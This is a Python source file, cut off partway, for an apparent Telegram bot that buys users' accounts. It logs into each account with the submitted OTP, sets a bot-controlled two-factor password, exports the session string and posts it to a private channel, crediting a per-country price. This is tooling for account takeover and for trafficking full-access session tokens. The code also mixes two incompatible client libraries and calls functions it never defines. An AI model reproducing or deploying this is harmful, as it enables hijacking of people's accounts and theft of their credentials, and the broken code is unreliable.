import os
import asyncio
import json
from datetime import datetime
from telegram import Update
from telegram.ext import CallbackContext
from pyrogram import Client
from bot.config import (
    API_ID, API_HASH, BOT_TOKEN,
    CHANNEL_SUBMIT, CHANNEL_VERIFIED, CHANNEL_REJECTED,
    SESSION_2FA_PASSWORD, VERIFICATION_DELAY
)
from bot.utils.storage import get_user_info, update_user_info, get_country_rates

# ---------------- Ensure sessions folder exists -----------------
os.makedirs("sessions", exist_ok=True)

# ---------------- JSON CREATORS -----------------
def create_submission_json(user_id, phone):
    return {
        "user_id": user_id,
        "phone": phone,
        "status": "pending",
        "created_at": str(datetime.now())
    }

def create_verified_json(user_id, phone, string_session, added_balance):
    return {
        "user_id": user_id,
        "phone": phone,
        "string_session": string_session,
        "2fa_enabled": True,
        "status": "verified",
        "balance_added": added_balance,
        "created_at": str(datetime.now()),
        "admin_set_2fa": True
    }

def create_rejected_json(user_id, phone):
    return {
        "user_id": user_id,
        "phone": phone,
        "status": "rejected",
        "reason": "2FA already enabled or verification failed",
        "message": "Sorry this account was rejected, disable the account password and try again ❌",
        "created_at": str(datetime.now())
    }

# ---------------- SEND PROCESSING MESSAGE -----------------
async def send_processing_message(pyro_client: Client, user_id: int):
    await pyro_client.send_message(
        chat_id=user_id, 
        text="🔄 Processing\n📳 Please wait for the code..."
    )

# ---------------- OTP REQUEST FUNCTION -----------------
async def send_otp_code(update: Update, context: CallbackContext, phone: str):
    user_id = update.message.chat.id
    await send_processing_message(context.bot, user_id)
    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)
    try:
        await client.send_code_request(phone)
        await update.message.reply_text(
            f"🔄 OTP sent to {phone}. Please check your Telegram."
        )
    except Exception as e:
        print(f"[ERROR] OTP sending failed: {e}")
    finally:
        await client.disconnect()

# ---------------- VERIFY FUNCTION -----------------
async def verify_account(update: Update, context: CallbackContext, phone: str, otp_code: str):
    user_id = update.message.chat.id
    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)
    try:
        await client.sign_in(phone=phone, code=otp_code)

        # 2FA সক্রিয় করা
        try:
            await client(functions.account.UpdatePasswordRequest(
                current_password=None,
                new_password=SESSION_2FA_PASSWORD,
                hint="By Bot",
                email=None
            ))
        except SessionPasswordNeededError:
            print(f"[INFO] 2FA already enabled for {phone}")

        # Session string export
        string_session = await client.export_session_string()

        # Country based balance
        user_info = get_user_info(user_id)
        country_code = user_info.get("country", "US")
        country_rates = get_country_rates()
        added_balance = country_rates.get(country_code.upper(), 0)
        new_balance = user_info.get("balance_usd", 0) + added_balance
        update_user_info(user_id, {"balance_usd": new_balance})

        # Send verified JSON
        verified_data = create_verified_json(user_id, phone, string_session, added_balance)
        file_name = f"{user_id}_verified.json"
        await send_json_to_channel(context.bot, CHANNEL_VERIFIED, verified_data, file_name)

        await update.message.reply_text(
            f"🎉 Account verified!\nNumber: {phone}\nPrice: ${added_balance} added to your balance."
        )
    except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
        await update.message.reply_text(
            "⛔ Invalid or expired code. Please try again carefully."
       
